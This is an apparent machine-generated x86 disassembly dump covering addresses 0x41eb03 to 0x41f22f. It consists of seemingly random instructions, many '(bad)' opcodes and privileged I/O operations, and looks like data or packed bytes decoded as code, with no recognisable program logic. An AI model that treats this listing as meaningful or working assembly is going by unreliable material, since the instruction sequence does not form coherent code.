  41eb03:	imul   ebx,DWORD PTR [edx-0x27163956],0x2d4a2b0c
  41eb0d:	imul   esi,DWORD PTR [esi+0x5b0b2364],0x8
  41eb14:	punpckhbw mm3,QWORD PTR [edx-0x27fc065a]
  41eb1b:	js     0x41eab2
  41eb1d:	mov    dl,0xcf
  41eb1f:	in     al,dx
  41eb20:	or     esp,DWORD PTR [ecx+0x42]
  41eb23:	xchg   esi,eax
  41eb24:	adc    esp,eax
  41eb26:	les    ecx,FWORD PTR [ecx+0x31]
  41eb29:	mov    al,0x3
  41eb2b:	mov    eax,eax
  41eb2d:	adc    eax,eax
  41eb2f:	sbb    edx,DWORD PTR [eax+0x1121720d]
  41eb35:	mov    esp,0x6cb022bc
  41eb3a:	test   ah,al
  41eb3c:	fnsave [edx+eiz*1]
  41eb3f:	and    DWORD PTR [esi+eax*8],ecx
  41eb42:	pusha  
  41eb43:	xor    DWORD PTR [ecx+edx*2-0x126fb54c],esi
  41eb4a:	inc    edx
  41eb4b:	and    dh,BYTE PTR [eax]
  41eb4d:	mov    al,0x1e
  41eb4f:	mov    al,0x6
  41eb51:	stc    
  41eb52:	es xchg ecx,eax
  41eb54:	adc    DWORD PTR [eax+0x30b8ac40],esi
  41eb5a:	es and al,0x11
  41eb5d:	lods   al,BYTE PTR ds:[esi]
  41eb5e:	dec    esi
  41eb5f:	test   al,0x89
  41eb61:	or     ebx,DWORD PTR [ebx-0x1557ee70]
  41eb67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb68:	adc    DWORD PTR [ebx],esp
  41eb6a:	mov    cl,0xb0
  41eb6c:	or     DWORD PTR [esp+ebx*1-0x4ede48d2],esp
  41eb73:	ins    BYTE PTR es:[edi],dx
  41eb74:	and    edx,eax
  41eb76:	adc    DWORD PTR [edx+eax*4],esp
  41eb79:	or     al,0xc6
  41eb7b:	pushf  
  41eb7c:	cmp    BYTE PTR [ecx+edx*1-0x4edb91ee],bl
  41eb83:	sub    eax,0x3264111b
  41eb88:	sahf   
  41eb89:	add    edx,esp
  41eb8b:	adc    BYTE PTR [esi+ecx*2+0x20c87994],0x11
  41eb93:	adc    DWORD PTR [ebx],esi
  41eb95:	sar    DWORD PTR [eax+0x3b264158],cl
  41eb9b:	nop
  41eb9c:	sub    DWORD PTR [eax+0xde4bef5],edx
  41eba2:	push   cs
  41eba3:	(bad)  
  41eba5:	jmp    0x5ba:0x9802ba90
  41ebac:	mov    DWORD PTR [ebx],eax
  41ebae:	mov    ecx,0xb8ac1e24
  41ebb3:	add    al,0x20
  41ebb5:	pop    es
  41ebb6:	mov    dl,0x2d
  41ebb8:	xor    ecx,eax
  41ebba:	shl    al,1
  41ebbc:	or     cl,BYTE PTR [ecx-0x6fc71b8d]
  41ebc2:	lds    ecx,FWORD PTR [ebx]
  41ebc4:	push   ecx
  41ebc5:	rcr    DWORD PTR [ebx],0x80
  41ebc8:	or     BYTE PTR [edx+0x1a],dh
  41ebcb:	clc    
  41ebcc:	adc    DWORD PTR [ebx-0x1a0bf7b9],esi
  41ebd2:	mov    edx,esp
  41ebd4:	mov    ds:0x6f314159,al
  41ebd9:	daa    
  41ebda:	adc    cl,BYTE PTR [edx]
  41ebdc:	jle    0x41eb6e
  41ebde:	imul   eax,DWORD PTR [ebp+0x6d],0x70
  41ebe2:	je     0x41ec5d
  41ebe4:	jmp    0x41eb81
  41ebe6:	das    
  41ebe7:	inc    edx
  41ebe8:	lock dec esi
  41ebea:	jne    0x41ebc7
  41ebec:	invd   
  41ebee:	push   ebx
  41ebef:	ins    DWORD PTR es:[edi],dx
  41ebf0:	ret    
  41ebf1:	pop    edx
  41ebf2:	add    DWORD PTR [ecx+eiz*2-0x27ec46f0],esi
  41ebf9:	pop    ebp
  41ebfa:	adc    al,0x99
  41ebfc:	pop    es
  41ebfd:	jmp    0x23b45169
  41ec02:	stc    
  41ec03:	fs (bad) 
  41ec06:	push   es
  41ec07:	pop    ds
  41ec08:	ins    BYTE PTR es:[di],dx
  41ec0a:	add    BYTE PTR gs:[edi],cl
  41ec0d:	inc    esp
  41ec0e:	outs   dx,DWORD PTR ds:[esi]
  41ec0f:	jne    0x41ec73
  41ec11:	inc    esi
  41ec12:	sar    edi,0xd
  41ec15:	inc    ebx
  41ec16:	inc    ebx
  41ec17:	jne    0x41ec8b
  41ec19:	jb     0x41ec80
  41ec1b:	outs   dx,BYTE PTR ds:[esi]
  41ec1c:	arpl   WORD PTR [ebx+0x56],dx
  41ec1f:	je     0x41ec29
  41ec21:	push   es
  41ec22:	dec    esp
  41ec23:	pop    ebx
  41ec24:	popa   
  41ec25:	xchg   DWORD PTR [eax+0x7f304f5d],esp
  41ec2b:	xor    esp,DWORD PTR ds:0x4eaa417b
  41ec31:	and    ebp,DWORD PTR [ebx+0x53b2c10d]
  41ec37:	mov    esp,0x64658087
  41ec3c:	xchg   ebx,eax
  41ec3d:	sub    bl,cl
  41ec3f:	popa   
  41ec40:	outs   dx,BYTE PTR ds:[esi]
  41ec41:	jns    0x4c390e66
  41ec47:	(bad)  
  41ec48:	push   ebp
  41ec49:	outs   dx,BYTE PTR ds:[esi]
  41ec4a:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  41ec4e:	inc    esp
  41ec4f:	arpl   WORD PTR gs:[ecx-0x32],bp
  41ec53:	fld    TBYTE PTR [esi]
  41ec55:	sti    
  41ec56:	mov    al,0x57
  41ec58:	and    al,0x30
  41ec5a:	inc    esi
  41ec5b:	out    0x68,eax
  41ec5d:	pop    edx
  41ec5e:	je     0x41ec38
  41ec60:	cmovnp ebx,DWORD PTR [esi]
  41ec63:	cwde   
  41ec64:	mov    ds:0x571b7942,eax
  41ec69:	pop    esp
  41ec6a:	adc    eax,0x726fe40c
  41ec6f:	fs in  al,dx
  41ec71:	push   esp
  41ec72:	in     al,dx
  41ec73:	faddp  st(0),st
  41ec75:	adc    esp,DWORD PTR [ebx+0x14343642]
  41ec7b:	add    ecx,DWORD PTR [eax+0x5ecfe321]
  41ec81:	push   ss
  41ec82:	iret   
  41ec83:	adc    eax,0xdcc20a30
  41ec88:	and    BYTE PTR [esi+0x62c1ad8],0xfb
  41ec8f:	mov    eax,ds:0x6aa3b0e7
  41ec94:	mov    ds:0x7714fff1,eax
  41ec99:	push   ss
  41ec9a:	inc    ecx
  41ec9b:	fcom   st(7)
  41ec9d:	adc    ecx,DWORD PTR [eax+0x43f421ed]
  41eca3:	sbb    al,0xe7
  41eca5:	fdivr  QWORD PTR [edi]
  41eca7:	and    bl,bh
  41eca9:	cdq    
  41ecaa:	mov    al,0x6e
  41ecac:	pop    ebx
  41ecad:	jmp    0x41ecc0
  41ecaf:	sbb    al,0xba
  41ecb1:	ss cwde 
  41ecb3:	pop    ss
  41ecb4:	add    DWORD PTR ds:0xe64e84f,eax
  41ecba:	test   al,0xb7
  41ecbc:	jno    0x41ec4b
  41ecbe:	inc    edi
  41ecbf:	lds    eax,FWORD PTR [edi+0x3bca7c98]
  41ecc5:	lea    edx,[esi+0x38]
  41ecc8:	add    bl,dh
  41ecca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eccb:	push   cs
  41eccc:	xchg   ebp,eax
  41eccd:	cld    
  41ecce:	jl     0x41ecbe
  41ecd0:	addr16 lock data16 adc al,0x8d
  41ecd5:	lar    eax,WORD PTR [edx]
  41ecd8:	stc    
  41ecd9:	popa   
  41ecda:	mov    edx,0x24d41a27
  41ecdf:	(bad)  
  41ece0:	out    dx,al
  41ece1:	das    
  41ece2:	xchg   esp,eax
  41ece3:	jne    0x41ecfd
  41ece5:	pop    ebx
  41ece6:	ins    BYTE PTR es:[edi],dx
  41ece7:	lea    esi,[eax+0x5f64c78f]
  41eced:	(bad)  
  41ecee:	mov    esi,0xc311ace8
  41ecf3:	adc    eax,0x302912d7
  41ecf8:	sbb    BYTE PTR [ecx],bl
  41ecfa:	ins    BYTE PTR es:[edi],dx
  41ecfb:	mov    al,0xf6
  41ecfd:	test   bh,0x20
  41ed00:	je     0x41ec85
  41ed02:	test   DWORD PTR [edx+edx*1+0x45203b40],esi
  41ed09:	les    edx,FWORD PTR cs:[esp+ebx*8]
  41ed0d:	mov    DWORD PTR [esi-0x76],edi
  41ed10:	add    DWORD PTR [ebx-0x12ecb8a2],ecx
  41ed16:	stos   DWORD PTR es:[edi],eax
  41ed17:	mov    ds:0x4f0c4c64,al
  41ed1c:	xchg   ecx,eax
  41ed1d:	xchg   BYTE PTR [ecx+ecx*1],bh
  41ed20:	aam    0xff
  41ed22:	inc    ecx
  41ed23:	outs   dx,BYTE PTR ds:[esi]
  41ed24:	jns    0x41ed6d
  41ed26:	dec    esi
  41ed27:	clc    
  41ed28:	add    dh,bh
  41ed2a:	and    BYTE PTR [ebx-0x749aadfa],ah
  41ed30:	and    eax,0xf66b804
  41ed35:	pop    es
  41ed36:	or     BYTE PTR [eax-0x10b91afa],0x3
  41ed3d:	or     al,BYTE PTR [ecx-0x46]
  41ed40:	shl    BYTE PTR [esi-0x29],cl
  41ed43:	push   0xdc8002bf
  41ed48:	enter  0x7d17,0xf4
  41ed4c:	adc    ah,cl
  41ed4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed4f:	add    BYTE PTR [edi],al
  41ed51:	xor    BYTE PTR [edx],dh
  41ed53:	mov    ah,0x86
  41ed55:	adc    DWORD PTR [ebp+edx*8-0x6e],ebp
  41ed59:	jo     0x41edd1
  41ed5b:	mov    ecx,0x5f231d0d
  41ed60:	push   esi
  41ed61:	mov    esi,0x4681c8f
  41ed66:	cmp    DWORD PTR [esi-0xb],edx
  41ed69:	inc    ecx
  41ed6a:	inc    esp
  41ed6b:	test   al,0x3b
  41ed6d:	fnsave [ebp-0x3e]
  41ed70:	in     eax,dx
  41ed71:	add    edx,DWORD PTR ds:0x6c5839aa
  41ed77:	dec    ebx
  41ed78:	sbb    DWORD PTR [ecx-0x2ea43fb9],0x7c
  41ed7f:	clc    
  41ed80:	mov    eax,DWORD PTR [eax+ebx*4]
  41ed83:	push   ecx
  41ed84:	das    
  41ed85:	push   0x5290a2b
  41ed8a:	(bad)  [edi]
  41ed8c:	cmp    esp,DWORD PTR [eax+0x77]
  41ed8f:	pop    ss
  41ed90:	push   DWORD PTR [ebp-0x18]
  41ed93:	repz fnstsw WORD PTR [ebx+ecx*2+0x4b]
  41ed98:	push   eax
  41ed99:	test   DWORD PTR [ebx],esi
  41ed9b:	shl    BYTE PTR [eax-0xe],1
  41ed9e:	out    dx,al
  41ed9f:	fsubr  QWORD PTR [ebx+0x75]
  41eda2:	mov    dh,BYTE PTR [ebx-0x20e7fc]
  41eda8:	cmp    ah,cl
  41edaa:	std    
  41edab:	adc    al,0xec
  41edad:	mov    edx,esp
  41edaf:	(bad)
  41edb5:	sbb    al,BYTE PTR [edx]
  41edb7:	cmp    DWORD PTR [eax-0x6f],edx
  41edba:	xlat   BYTE PTR ds:[ebx]
  41edbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edbc:	stos   BYTE PTR es:[edi],al
  41edbd:	adc    ebx,DWORD PTR [esi]
  41edbf:	sbb    al,0xeb
  41edc1:	pop    es
  41edc2:	loop   0x41edf8
  41edc4:	push   edi
  41edc5:	into   
  41edc6:	call   0x66ba2e0
  41edcb:	jge    0x41ed4d
  41edcd:	mov    ecx,0x3b7505f8
  41edd2:	jnp    0x41edd8
  41edd4:	je     0x41edf5
  41edd6:	jl     0x41ee1f
  41edd8:	test   DWORD PTR [ebp+0x11],edi
  41eddb:	fist   DWORD PTR [eax]
  41eddd:	pop    ds
  41edde:	into   
  41eddf:	xor    eax,0x7b0343f8
  41ede4:	xchg   DWORD PTR [edx+0x5a8b7fc8],eax
  41edea:	inc    ecx
  41edeb:	xor    BYTE PTR [eax+0xb],0xed
  41edef:	data16 aam 0xc4
  41edf2:	xlat   BYTE PTR ds:[ebx]
  41edf3:	xor    eax,0x35c67b3f
  41edf8:	cmp    al,ch
  41edfa:	inc    ebp
  41edfb:	out    dx,eax
  41edfc:	jge    0x41edf5
  41edfe:	sbb    eax,0x52148da4
  41ee03:	add    edx,0x448a70f0
  41ee09:	add    dl,dh
  41ee0b:	inc    ecx
  41ee0c:	xor    al,0xe2
  41ee0e:	ins    BYTE PTR es:[edi],dx
  41ee0f:	pop    eax
  41ee10:	add    BYTE PTR [edi],al
  41ee12:	(bad)  
  41ee13:	int3   
  41ee14:	mov    cs:0x8b5fbbee,al
  41ee1a:	sub    bh,bh
  41ee1c:	push   ebp
  41ee1d:	or     al,0x7d
  41ee1f:	adc    ah,BYTE PTR [eax+0x67643055]
  41ee25:	(bad)
  41ee28:	pop    ebp
  41ee29:	jno    0x41ee37
  41ee2b:	push   0x60
  41ee2d:	jmp    0x41ee99
  41ee2f:	push   ebp
  41ee30:	sti    
  41ee31:	and    BYTE PTR [edi+0x7e531684],cl
  41ee37:	fsubp  st(7),st
  41ee39:	test   al,0xab
  41ee3b:	mov    edx,0x404d1ab5
  41ee40:	add    al,0xb7
  41ee42:	push   ss
  41ee43:	call   0xe0459038
  41ee48:	adc    eax,0x7f0d8bab
  41ee4d:	pop    es
  41ee4e:	test   BYTE PTR [edx],al
  41ee50:	cdq    
  41ee51:	inc    esi
  41ee52:	gs jns 0x41ee33
  41ee55:	idiv   BYTE PTR [ecx-0x75da895e]
  41ee5b:	pop    esi
  41ee5c:	aam    0xec
  41ee5e:	push   ebx
  41ee5f:	scas   eax,DWORD PTR es:[edi]
  41ee60:	test   al,0x46
  41ee62:	aad    0xf
  41ee64:	jle    0x41ee6e
  41ee66:	or     eax,0xf10022d4
  41ee6b:	and    al,0xec
  41ee6d:	sbb    eax,DWORD PTR [eax+0x5]
  41ee70:	xor    esi,esp
  41ee72:	bound  edx,QWORD PTR [edi+0x6c8969e9]
  41ee78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee79:	lea    ebp,[edi+0x5690e192]
  41ee7f:	add    esi,esi
  41ee81:	or     eax,ebx
  41ee83:	in     al,dx
  41ee84:	adc    al,0xee
  41ee86:	add    BYTE PTR [eax],bl
  41ee88:	daa    
  41ee89:	mov    ebp,0x300c2207
  41ee8e:	repz les esp,FWORD PTR [eax]
  41ee91:	xor    edx,DWORD PTR [ebx+eax*4+0x0]
  41ee95:	cmc    
  41ee96:	int    0x1b
  41ee98:	or     al,BYTE PTR [edi+eiz*1-0x38]
  41ee9c:	push   ebp
  41ee9d:	mov    al,0xec
  41ee9f:	mov    ebp,0xb171eff
  41eea4:	jle    0x41eec2
  41eea6:	push   esi
  41eea7:	pusha  
  41eea8:	(bad)  
  41eea9:	lahf   
  41eeaa:	lock cmp DWORD PTR ds:0xfa558ee5,0xfffffffe
  41eeb2:	add    BYTE PTR [eax+0x26],dh
  41eeb5:	jb     0x41eebe
  41eeb7:	push   es
  41eeb8:	add    BYTE PTR [eax+0x76eab110],bl
  41eebe:	inc    edi
  41eebf:	adc    dh,BYTE PTR [esi-0x7fa32eae]
  41eec5:	sbb    al,0x7e
  41eec7:	dec    ebx
  41eec8:	(bad)  
  41eec9:	cmp    edi,DWORD PTR [ecx-0x2a]
  41eecc:	jle    0x41eeae
  41eece:	pusha  
  41eecf:	mov    eax,ds:0x50edcd3c
  41eed4:	popa   
  41eed5:	and    DWORD PTR [ecx-0x5],ecx
  41eed8:	pushf  
  41eed9:	sub    al,0x1c
  41eedb:	push   cs
  41eedc:	(bad)  
  41eedd:	or     eax,0xfc23bf6
  41eee2:	lahf   
  41eee3:	cmp    BYTE PTR [esi],ah
  41eee5:	and    BYTE PTR [ebx+0x6756b884],cl
  41eeeb:	xor    al,0xc6
  41eeed:	mov    al,ds:0xec530ace
  41eef2:	jne    0x41ef19
  41eef4:	pop    es
  41eef5:	test   BYTE PTR [ebp+0x64],ah
  41eef8:	jo     0x41eeda
  41eefa:	adc    DWORD PTR [bp+di+0x2],eax
  41eefe:	pusha  
  41eeff:	leave  
  41ef00:	push   ecx
  41ef01:	fwait
  41ef02:	in     al,0x21
  41ef04:	sub    esp,eax
  41ef06:	fistp  WORD PTR [eax+0x49]
  41ef09:	sbb    dh,0xc9
  41ef0c:	jbe    0x41ef01
  41ef0e:	fst    QWORD PTR [eax]
  41ef10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef11:	mov    al,ds:0x1b4175b8
  41ef16:	cwde   
  41ef17:	in     al,dx
  41ef18:	mov    ebp,0xb911f0dc
  41ef1d:	adc    eax,0x64790c7e
  41ef22:	cld    
  41ef23:	inc    ebx
  41ef24:	adc    BYTE PTR [ecx],bh
  41ef26:	(bad)  
  41ef27:	or     al,0x28
  41ef29:	leave  
  41ef2a:	dec    ebx
  41ef2b:	and    dh,BYTE PTR [ebp-0x20]
  41ef2e:	out    0xde,al
  41ef30:	xchg   edx,eax
  41ef31:	cmp    al,0x2c
  41ef33:	pop    ss
  41ef34:	loope  0x41eebf
  41ef36:	ja     0x41ef39
  41ef38:	jae    0x41efb3
  41ef3a:	cs mov ah,0xaa
  41ef3d:	ret    
  41ef3e:	cmp    bl,ah
  41ef40:	mov    ds:0x70a324c3,eax
  41ef45:	xlat   BYTE PTR ds:[ebx]
  41ef46:	mov    bl,0xeb
  41ef48:	push   ss
  41ef49:	or     BYTE PTR [ecx],cl
  41ef4b:	ror    BYTE PTR [esp+ecx*1-0x40],0xbf
  41ef50:	pop    esp
  41ef51:	mov    DWORD PTR [edx+eiz*1-0x8],ebx
  41ef55:	push   cs
  41ef56:	pushf  
  41ef57:	unpcklps xmm1,XMMWORD PTR [edi+eax*8+0x10]
  41ef5c:	xchg   ecx,eax
  41ef5d:	iret   
  41ef5e:	scas   al,BYTE PTR es:[edi]
  41ef5f:	lock ins BYTE PTR es:[edi],dx
  41ef61:	fisttp WORD PTR [ecx+ebx*8]
  41ef64:	fadd   DWORD PTR [esi-0x64]
  41ef67:	enter  0xc8e7,0xd8
  41ef6b:	retf   0x1938
  41ef6e:	mov    ah,0xcd
  41ef70:	fs dec eax
  41ef72:	cmp    al,0x31
  41ef74:	or     DWORD PTR [ebp-0x1c],esp
  41ef77:	aam    0x84
  41ef79:	rcr    BYTE PTR [ebx],0x48
  41ef7c:	inc    esp
  41ef7d:	inc    eax
  41ef7e:	pop    esi
  41ef7f:	push   ss
  41ef80:	pop    ds
  41ef81:	loope  0x41ef13
  41ef83:	inc    ecx
  41ef84:	ds push edi
  41ef86:	adc    edx,DWORD PTR [esi]
  41ef88:	stos   BYTE PTR es:[edi],al
  41ef89:	xchg   esp,eax
  41ef8a:	pop    es
  41ef8b:	stos   DWORD PTR es:[edi],eax
  41ef8c:	push   es
  41ef8d:	sbb    DWORD PTR [eax+edx*4-0x54],esp
  41ef91:	lods   eax,DWORD PTR ds:[esi]
  41ef92:	scas   al,BYTE PTR es:[edi]
  41ef93:	scas   eax,DWORD PTR es:[edi]
  41ef94:	sbb    DWORD PTR [eax+edx*4+0x41],esp
  41ef98:	nop
  41ef99:	xchg   ecx,eax
  41ef9a:	xchg   edx,eax
  41ef9b:	fs nop
  41ef9d:	inc    ecx
  41ef9e:	push   es
  41ef9f:	xchg   ebx,eax
  41efa0:	xchg   esp,eax
  41efa1:	xchg   ebp,eax
  41efa2:	leave  
  41efa3:	leave  
  41efa4:	and    bl,BYTE PTR [esi]
  41efa6:	xchg   esi,eax
  41efa7:	inc    DWORD PTR [eax]
  41efa9:	mov    bh,0xe2
  41efab:	and    DWORD PTR ds:0x58392f24,ebp
  41efb1:	cmp    dl,ah
  41efb3:	sub    BYTE PTR [esi],bl
  41efb5:	test   BYTE PTR [eax+eax*1+0x10d7fb1a],al
  41efbc:	add    ecx,DWORD PTR [eax]
  41efbe:	add    edi,esi
  41efc0:	add    DWORD PTR [edi],eax
  41efc2:	in     al,0xb2
  41efc4:	pop    ecx
  41efc5:	outs   dx,DWORD PTR ds:[esi]
  41efc6:	arpl   WORD PTR [esi-0xbb98ac4],sp
  41efcc:	nop
  41efcd:	xchg   DWORD PTR [edi],ebx
  41efcf:	mov    ebx,0xd784438c
  41efd4:	mov    esp,0x77420a8c
  41efd9:	loop   0x41ef88
  41efdb:	enter  0xb765,0x85
  41efdf:	ds add ebx,eax
  41efe2:	mov    ebx,0x81c94cdd
  41efe7:	or     al,0x40
  41efe9:	in     al,0x40
  41efeb:	add    DWORD PTR [edx-0x1cdceeb3],eax
  41eff1:	cmp    al,0x7b
  41eff3:	and    BYTE PTR ds:0x3ce32272,al
  41eff9:	xchg   BYTE PTR ds:0x7ca5e16c,dl
  41efff:	ins    DWORD PTR es:[edi],dx
  41f000:	mov    bh,0x2a
  41f002:	pusha  
  41f003:	sub    cl,bl
  41f005:	pop    ebx
  41f006:	cwde   
  41f007:	cwde   
  41f008:	add    eax,0x5747254c
  41f00d:	loop   0x41efff
  41f00f:	inc    esi
  41f010:	mov    eax,ds:0x4d4aca64
  41f015:	pop    edi
  41f016:	clc    
  41f017:	sub    BYTE PTR [edi-0x37],al
  41f01a:	xchg   ebx,eax
  41f01b:	clc    
  41f01c:	jecxz  0x41f06a
  41f01e:	or     eax,0x832c2b72
  41f023:	inc    eax
  41f024:	pop    ds
  41f025:	pop    ebx
  41f026:	in     al,0x54
  41f028:	in     eax,0x8
  41f02a:	in     al,0x45
  41f02c:	in     al,0x54
  41f02e:	or     esp,DWORD PTR ds:0x4fd0ac5d
  41f034:	jo     0x41f022
  41f036:	pop    ecx
  41f037:	push   edi
  41f038:	lods   al,BYTE PTR ds:[esi]
  41f039:	and    eax,DWORD PTR [edi+0x20]
  41f03c:	or     al,0xac
  41f03e:	adc    ecx,DWORD PTR [ebx]
  41f040:	jb     0x41f08a
  41f042:	and    al,0x60
  41f045:	push   edi
  41f046:	in     eax,0x4
  41f048:	test   eax,0xe59e792a
  41f04e:	add    al,0xc
  41f050:	in     al,0x74
  41f052:	(bad)  
  41f053:	loop   0x41f0a5
  41f055:	mov    esi,0x6d5c570b
  41f05a:	add    al,0x32
  41f05c:	xchg   esp,eax
  41f05d:	pop    esp
  41f05e:	scas   eax,DWORD PTR es:[edi]
  41f05f:	in     al,0xb0
  41f061:	inc    edi
  41f062:	add    DWORD PTR [ecx],ecx
  41f064:	scas   eax,DWORD PTR es:[edi]
  41f065:	mov    ah,0xdb
  41f067:	or     BYTE PTR [ecx+eiz*4+0x4caf77b4],cl
  41f06e:	or     DWORD PTR [eax],edx
  41f070:	cmp    al,0xe4
  41f072:	imul   esi,DWORD PTR [ebx+0x74],0x42cb0ce6
  41f079:	sub    DWORD PTR [eax+0x750ce613],edx
  41f07f:	xchg   edx,eax
  41f080:	in     eax,dx
  41f081:	xchg   ecx,eax
  41f082:	ins    BYTE PTR es:[edi],dx
  41f083:	pop    ebp
  41f084:	jae    0x41f0e5
  41f086:	ins    BYTE PTR es:[edi],dx
  41f087:	or     BYTE PTR [esi+0x116c8640],cl
  41f08d:	and    BYTE PTR [eax-0x3a987370],0x87
  41f094:	xchg   edx,eax
  41f095:	int    0x71
  41f097:	hlt    
  41f098:	ja     0x41f0f9
  41f09a:	int3   
  41f09b:	fcom   QWORD PTR [eax]
  41f09d:	jbe    0x41f0a6
  41f09f:	pusha  
  41f0a0:	adc    eax,0xf247f0ab
  41f0a5:	push   eax
  41f0a6:	mov    edi,0x1fd9b777
  41f0ab:	repz icebp 
  41f0ad:	and    BYTE PTR [ebx],al
  41f0af:	pushf  
  41f0b0:	add    eax,0xe763c954
  41f0b5:	xor    dl,dh
  41f0b7:	inc    esp
  41f0b8:	push   esi
  41f0b9:	add    ebx,ecx
  41f0bb:	out    0x30,eax
  41f0bd:	and    al,0xdd
  41f0bf:	fwait
  41f0c0:	jl     0x41f0c2
  41f0c2:	repz enter 0x590b,0x37
  41f0c7:	mov    BYTE PTR [esi+ebx*2+0x36],ch
  41f0cb:	fs inc edi
  41f0cd:	mov    ah,0x57
  41f0cf:	out    0x94,eax
  41f0d1:	mov    ds:0x4edcd704,al
  41f0d6:	xor    ch,0x3c
  41f0d9:	add    esi,esi
  41f0db:	dec    esp
  41f0dc:	push   esp
  41f0dd:	or     esi,DWORD PTR [ebx+0x2b]
  41f0e0:	gs pusha 
  41f0e2:	push   0x11884102
  41f0e7:	test   DWORD PTR [eax],0x5b0b7256
  41f0ed:	pop    eax
  41f0ee:	jno    0x41f140
  41f0f0:	sub    eax,0xcb516e73
  41f0f5:	retf   
  41f0f6:	pusha  
  41f0f7:	add    edi,DWORD PTR [ebx-0x4c]
  41f0fa:	pop    es
  41f0fb:	adc    al,BYTE PTR [eax+eiz*2-0x7dabfdf9]
  41f102:	loopne 0x41f147
  41f104:	ins    BYTE PTR es:[edi],dx
  41f105:	popa   
  41f106:	mov    esi,DWORD PTR [edi]
  41f108:	push   0xe70fc27f
  41f10d:	fmul   QWORD PTR [edi]
  41f10f:	cmovns edx,eax
  41f112:	jae    0x41f155
  41f114:	fs popa 
  41f116:	jo     0x41f144
  41f118:	fdivr  st,st(7)
  41f11a:	inc    DWORD PTR [esi]
  41f11c:	aaa    
  41f11d:	add    BYTE PTR [ecx],0x34
  41f120:	das    
  41f121:	pushf  
  41f122:	jae    0x41f110
  41f124:	push   edx
  41f125:	rcl    BYTE PTR [ecx],1
  41f127:	sahf   
  41f128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f129:	add    BYTE PTR [eax],ah
  41f12b:	scas   eax,DWORD PTR es:[edi]
  41f12c:	cmp    eax,0x6036da82
  41f131:	sbb    edi,DWORD PTR [eax+0x6f]
  41f134:	jne    0x41f195
  41f136:	jle    0x41f120
  41f138:	outs   dx,DWORD PTR ds:[esi]
  41f139:	ret    
  41f13a:	neg    DWORD PTR [ebx+0x76]
  41f13d:	in     al,dx
  41f13e:	call   0x202b011f
  41f143:	(bad)  
  41f144:	psubw  mm4,QWORD PTR [ecx]
  41f147:	pop    edi
  41f148:	retf   
  41f149:	xchg   ebx,eax
  41f14a:	pop    ss
  41f14b:	fnstcw WORD PTR [ebx+edx*8]
  41f14e:	test   DWORD PTR [ecx+edi*8],0xd832f844
  41f155:	xor    DWORD PTR [eax-0x3704e0c4],esp
  41f15b:	pop    es
  41f15c:	ror    ch,1
  41f15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f15f:	jmp    0x41f143
  41f161:	cld    
  41f162:	sub    BYTE PTR [ecx-0x3c],ch
  41f165:	add    edi,eax
  41f167:	add    ah,BYTE PTR [eax-0x18]
  41f16a:	dec    ebp
  41f16b:	xlat   BYTE PTR ds:[ebx]
  41f16c:	pop    ebp
  41f16d:	add    ebp,DWORD PTR cs:[eax+0x3c3b3004]
  41f174:	add    esp,DWORD PTR [eax-0x7c]
  41f177:	mov    bh,0xee
  41f179:	fs inc eax
  41f17b:	pop    ebx
  41f17c:	cli    
  41f17d:	loopne 0x41f1b6
  41f17f:	aam    0x3
  41f181:	std    
  41f182:	push   eax
  41f183:	outs   dx,BYTE PTR ds:[esi]
  41f184:	ja     0x41f13c
  41f186:	xor    edx,DWORD PTR [edi-0x1e84f02]
  41f18c:	outs   dx,DWORD PTR ds:[esi]
  41f18d:	call   DWORD PTR [ebx+eax*1]
  41f190:	inc    ecx
  41f191:	xlat   BYTE PTR ds:[ebx]
  41f192:	pop    esp
  41f193:	mov    edx,0x1144b68
  41f198:	lods   al,BYTE PTR ds:[esi]
  41f199:	add    al,0x3
  41f19b:	cwde   
  41f19c:	loope  0x41f190
  41f19e:	add    BYTE PTR [ebp-0x3d],0xe7
  41f1a2:	fmul   DWORD PTR [eax+ecx*1]
  41f1a5:	push   esp
  41f1a6:	adc    bl,ch
  41f1a8:	xchg   edx,eax
  41f1a9:	in     eax,dx
  41f1aa:	push   es
  41f1ab:	nop
  41f1ac:	(bad)  
  41f1ad:	cld    
  41f1ae:	pop    es
  41f1af:	push   cs
  41f1b0:	or     eax,0xfec235c
  41f1b5:	add    esp,DWORD PTR [ecx-0x16f4bb50]
  41f1bb:	and    BYTE PTR [esi],cl
  41f1bd:	or     esp,DWORD PTR [ebx]
  41f1bf:	mov    ds:0x49185d92,al
  41f1c4:	aas    
  41f1c5:	ins    DWORD PTR es:[edi],dx
  41f1c6:	or     BYTE PTR [esi+0x1],cl
  41f1c9:	imul   edi,DWORD PTR [eax+0x1fe93f2c],0x660719cf
  41f1d3:	sub    dl,0xfa
  41f1d6:	(bad)  
  41f1d8:	jl     0x41f1e3
  41f1da:	jns    0x41f1fe
  41f1dc:	loope  0x41f1c6
  41f1de:	adc    BYTE PTR [edi],ch
  41f1e0:	add    DWORD PTR [eax+esi*2],eax
  41f1e3:	dec    edi
  41f1e4:	push   0x701ee9a
  41f1e9:	sbb    BYTE PTR [ebx],al
  41f1eb:	dec    esp
  41f1ec:	push   eax
  41f1ed:	push   esp
  41f1ee:	das    
  41f1ef:	or     al,cl
  41f1f1:	in     eax,dx
  41f1f2:	dec    esi
  41f1f3:	push   0x2409036e
  41f1f8:	clc    
  41f1f9:	das    
  41f1fa:	or     ch,bh
  41f1fc:	or     cl,BYTE PTR [eax-0x28bdc22e]
  41f202:	cmp    ecx,esp
  41f204:	add    ebx,eax
  41f206:	das    
  41f207:	add    DWORD PTR ds:0x6db40374,eax
  41f20d:	dec    ecx
  41f20e:	push   ds
  41f20f:	loope  0x41f217
  41f211:	and    BYTE PTR [edi],ch
  41f213:	add    DWORD PTR [edi],eax
  41f215:	mov    al,0xb
  41f217:	in     al,dx
  41f218:	jbe    0x41f288
  41f21a:	test   al,dl
  41f21c:	add    edi,esp
  41f21e:	das    
  41f21f:	aaa    
  41f220:	ja     0x41f227
  41f222:	pop    eax
  41f223:	adc    BYTE PTR [edx+0x7367e76e],bh
  41f229:	push   es
  41f22a:	mov    al,ds:0x5003405b
  41f22f:	add    dh,bh
